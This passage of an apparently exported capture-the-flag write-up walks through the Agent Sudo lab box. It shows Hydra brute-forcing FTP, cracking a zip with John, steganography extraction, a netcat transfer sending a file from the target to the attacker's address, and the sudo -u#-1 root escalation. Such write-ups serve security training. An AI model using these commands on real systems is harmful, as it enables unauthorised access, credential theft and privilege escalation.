integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f580b73-71f4-44ee-955d-3fdad94f488e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.32.11</code></pre><ul id="3bb3b028-8aea-458e-8a5f-9f026bb580f5" class="bulleted-list"><li style="list-style-type:disc">-l is our login username</li></ul><ul id="990c967a-2702-4ade-a4a1-ce4979f10a92" class="bulleted-list"><li style="list-style-type:disc">-P is the path to our password word list file to use</li></ul><figure id="4d1200b3-c306-4cf5-a0e9-464cb937ee74" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2011.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2011.png"/></a></figure><p id="b4fa6aa6-be4a-469e-8b7f-8520871e9a9f" class="">We find the password.</p><h2 id="a7c2d8ec-e553-45c4-a1be-05a7f55c63d5" class="">Zip file password</h2><p id="b0102c30-6cdf-4342-829c-1b8fe28f3f4e" class="">We can now login to the FTP as chris.</p><p id="025c1ae3-6713-42bb-8db7-f7dc3b7f1863" class="">Getting the directory information with <strong><em>dir </em></strong>we see three files. It’s also worth noting that we are unable to escape the directory by using <strong><em>cd ..</em></strong></p><figure id="de623285-c5be-4f84-8d06-8b6738591638" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2012.png"><img style="width:568px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2012.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fdb555b4-b617-4dfe-863b-bf534bbda509" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">get To_agentJ.txt -</code></pre><p id="5e492acc-f415-4015-92f2-b9684f45b325" class="">Outputs the contents of the file to the terminal.</p><figure id="dc8c4ce9-5bd8-460b-8ae5-6fc88990dc78" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2013.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2013.png"/></a></figure><p id="d102a56f-3f87-41ba-a78a-663779038303" class="">This note implies that there is something hidden in one of the images for us to find.</p><p id="ce4faf30-22da-46f0-b342-869ee49fc9ae" class="">We download the other two files to our machine so we can inspect them further.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6823a50b-fa70-49c5-a14a-c40e1bd511ac" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">exiftool cutie.png</code></pre><p id="d4d23765-40f4-47a9-a225-bbe5812645ce" class="">exiftool lets us read the meta information for an image.</p><figure id="62571821-eee8-4bc8-85a4-fb7f74d96e5a" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2014.png"><img style="width:654px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2014.png"/></a></figure><p id="ab8f78af-56bf-423a-a26a-48f5e1f0c7bc" class="">Here we see a warning regarding the file, that the data after the PNG IEND chunk seems to be invalid.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="743d6288-ce8a-4329-9211-f62da15cd775" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">xxd cutie.png</code></pre><figure id="03d29185-28ab-4b75-9603-5c011e183ca5" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2015.png"><img style="width:543px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2015.png"/></a></figure><p id="43e1bbdf-bace-4b2e-a21b-5fcfe49a1b34" class="">Will output the hex dump of the file, and near the end of the output, there is a message to Agent R.</p><p id="28eaa5ae-7b81-4838-9074-bc629aad467f" class="">Alternatively, you can use</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="50cb0087-cdb9-4f98-b7e4-913dc20795aa" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">strings cutie.png</code></pre><p id="5cf1ccd0-6c8f-46de-a81c-3e084a931264" class="">Which will also show the message to Agent R.</p><figure id="85238b1c-64ba-4770-b890-62d236bfa42f" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2016.png"><img style="width:142px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2016.png"/></a></figure><p id="4b865e9e-f682-4109-a30c-a6a9eca09b56" class="">To extract this file from the image we use <strong>binwalk</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="79f02a2d-d438-4e0a-aec9-aee97f7b6f43" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">binwalk -e cutie.png</code></pre><ul id="981487b9-8557-4b7c-a90a-ebfdf6f76a1d" class="bulleted-list"><li style="list-style-type:disc">-e To extract  the files found</li></ul><figure id="e88ab2c2-cd88-42fe-9d65-a5ef8607b64f" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2017.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2017.png"/></a></figure><figure id="fe1f40b0-c1e7-448c-99a2-0192e38603aa" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2018.png"><img style="width:415px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2018.png"/></a></figure><p id="588accf9-2a9b-4d7f-89f3-6610d1700dd1" class="">In total we received three files. With the zip file containing the text document we want to access.</p><figure id="08e310d9-3464-436d-9455-347fc547128c" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2019.png"><img style="width:576px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2019.png"/></a></figure><p id="4a4bdb9d-0a74-4802-8508-099dfb9b111a" class="">However, this zip file is protected by a password.</p><p id="b3286e1c-7dbe-47ac-8f13-f9fc2495cb91" class="">To crack this we can use John.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1441547b-c039-4a47-bdda-79f1b7cefaca" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">zip2john 8702.zip &gt; 8702.hash</code></pre><p id="b1bc21ec-b27a-4788-91aa-2c798d344654" class="">We create a hash file which we can then pass to John to crack.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4117d284-1c52-47ea-9726-28b1c3db3f84" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">john 8702.hash -w /usr/share/wordlists/rockyou.txt</code></pre><figure id="a68a1987-29d5-4d5a-aff5-44235eb8785f" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2020.png"><img style="width:686px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2020.png"/></a></figure><p id="2dc66763-e582-483c-ab10-dd941d120b48" class="">We now have the password to the zip file.</p><h2 id="1b9ed60a-3658-4ba9-b00c-49b3455912f7" class="">steg password</h2><p id="2f46a01d-75e8-41ec-a9ec-8ed525d8e620" class="">I had trouble extracting the .zip with <strong>unzip </strong>so switched to <strong>7z </strong>which seemd to do the trick.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f96328db-ad58-4410-9c32-2bd56c39b13c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">7z x 8702.zip</code></pre><figure id="c7af5fd5-949b-487f-bba4-97d1f8b2ea8e" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2021.png"><img style="width:550px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2021.png"/></a></figure><p id="60aac9b8-ced7-4e6f-8692-4fb8aa2777a6" class="">We can then view the contents of the note</p><figure id="51c56cae-497a-400a-b4e4-170626341bd3" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2022.png"><img style="width:502px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2022.png"/></a></figure><p id="22e1069b-ab99-4d44-88eb-b00c88eaf0b8" class="">The string is encoded in Base64, inputting this string into CyberChef allows us to convert it.</p><p id="4c1e1c5d-e943-4f25-8270-03eb2364d7e5" class=""><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><figure id="a382e592-d70b-4169-8518-e46c5b5448a2" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2023.png"><img style="width:202px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2023.png"/></a></figure><p id="50bb2c93-e123-4606-8fb9-02bdab6dee27" class="">However, we still need to find a file which is using steganography. The most likely candidate would be the other image we received from FTP.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ac805a3a-0824-40cb-8f5a-678451f8c562" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">steghide info cute-alien.jpg </code></pre><p id="02a4f533-cf8c-4a06-bedd-92e146a1dca3" class="">We use the string we obtained from the Base64 decoding as our passphrase and we discover an embedded file called message.txt</p><figure id="e1f8aefe-2097-4f80-b9c0-6b7847cf5de7" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2024.png"><img style="width:262px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2024.png"/></a></figure><h2 id="860213be-de45-41ac-9f29-a936d449b015" class="">Who is the other agent (in full name)?</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3a6f11ea-b08c-4a02-92e1-09f4b17f93af" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">steghide extract -sf cute-alien.jpg </code></pre><p id="2b384755-a04f-43c0-a497-04e29a903182" class="">We extract this message using steghide and then view the contents of message.txt</p><figure id="c680345d-3e59-4f64-86f9-00ffda56fea8" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2025.png"><img style="width:686px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2025.png"/></a></figure><p id="4a634908-c32e-4fdc-a5e7-c368ed067a83" class="">We find the message addressed to the other agent.</p><h2 id="5fd6007e-b626-454a-b9cf-e453886ef809" class="">SSH password</h2><p id="e8080cf4-52bb-4630-ae51-655346476904" class="">The SSH password was found in message.txt, and allows us to login as the other agent</p><h1 id="f2f02c51-35fb-455e-bc7c-ec13ac0263e6" class="">Capture the user flag</h1><h2 id="e529eb59-1cc5-4da3-a421-f4dc959c034f" class="">What is the user flag?</h2><p id="f0df7152-6a0a-47e6-b54d-4d85dd2cd0e7" class="">Now we have a login and password for SSH, we use it to connect to the server.</p><figure id="a200b2cd-c824-4589-b391-797a289f6b85" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2026.png"><img style="width:365px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2026.png"/></a></figure><p id="a715fab5-bda2-4845-8f7f-2cb5d78f520d" class="">Using <strong>ls -la </strong>to list the directory after logging in, we find the user_flag file.</p><p id="d2c265c6-b6cb-4d01-9394-d3561e1d0534" class="">Reading this file gives us the flag.</p><h2 id="17fa5d70-7215-4caa-be31-d37e4f3d31a8" class="">What is the incident of the photo called?</h2><p id="f6b773b0-9529-44ff-8aa5-fb88f3ab1cef" class="">The photo in question is most likely the Alien_autospy.jpg</p><p id="09a67728-4851-4c61-9335-5a1cadda60d2" class="">To transfer this file to our local machine, I’m going to use nc</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6ff6326d-7f7a-44b7-a87f-412af2e68915" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nc -w 3 &lt;your-ip-address&gt; &lt;port-numbner&gt; &lt; Alien_autospy.jpg</code></pre><p id="57c52baa-eb12-47b0-af1a-a32c654a0b76" class="">And on the local machine to receive the file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3dc21851-4048-4e56-bb64-983cfcedd0be" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nc -l -p &lt;port-numbner&gt; &gt; Alien_autospy.jpg</code></pre><p id="dd8e6bb3-203d-49c6-bb4b-91c33e53caa3" class="">We then use a simple reverse image search on the image to find out what the incident of the photo is called.</p><ul id="427fe33c-2d0b-47b1-9cfc-1d444a64bbd6" class="toggle"><li><details><summary>It took me a while to find the correct site so below is the site to visit for the flag answer.</summary><p id="44c46fdf-ff87-4861-b938-403c2ef5fa57" class=""><a href="https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment">https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment</a></p></details></li></ul><h1 id="2da2dadb-871b-44eb-8797-eaac9d009f87" class="">Privilege escalation</h1><h2 id="f1a97b63-14b1-4bf7-a86f-2edc205504c4" class="">CVE number for the escalation</h2><p id="7f6290c7-5309-4ff8-8fb5-de22c4f14548" class="">The first thing we try for privilege escalation is to use <strong>sudo -l</strong></p><p id="10a58fa3-c9a0-429a-a5d0-c8c4f9957dda" class="">This will list everything we can use sudo on.</p><figure id="18db00ce-c6c0-4459-99ea-ec485cffef19" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2027.png"><img style="width:462px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2027.png"/></a></figure><p id="ec03bd5b-e3f0-41d1-82a2-cc1fbddbb24f" class="">This seems interesting, a quick search of (ALL, !root) /bin/bash gives us an exploit and CVE number</p><p id="d8f4214f-a30b-43f5-8532-9d97c5dc191d" class=""><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p><h2 id="b1dda4ff-612c-4262-bd37-0c446106738a" class="">What is the root flag?</h2><p id="c213b306-521c-47dd-a28f-97f675b31854" class="">The exploit command to use to gain root privileges is</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ecd8ff3c-31ee-4b93-8cb4-8ab361e8df4a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo -u#-1 /bin/bash</code></pre><figure id="82703bf7-3821-4dd6-9d2f-5fd93c393801" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2028.png"><img style="width:205px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2028.png"/></a></figure><p id="716e6ff3-0d80-4fb9-b39b-857d23aa0173" class="">A quick use of whoami shows we are now root.</p><figure id="14b8d193-3cda-427d-b773-8f7d76bf2a47" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2029.png"><img style="width:444px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2029.png"/></a></figure><p id="d1483532-3009-41a1-9c88-9a1d431ca850" class="">We navigate to the root directory and find our root flag</p><h2 id="2001449a-9521-4af4-9807-da12b3121a3b" class="">(Bonus) Who is Agent R?</h2><p id="125d20cc-9a4a-4f65-922b-49b0bb1fdda4" class="">In the root flag we discover who Agent R is.</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
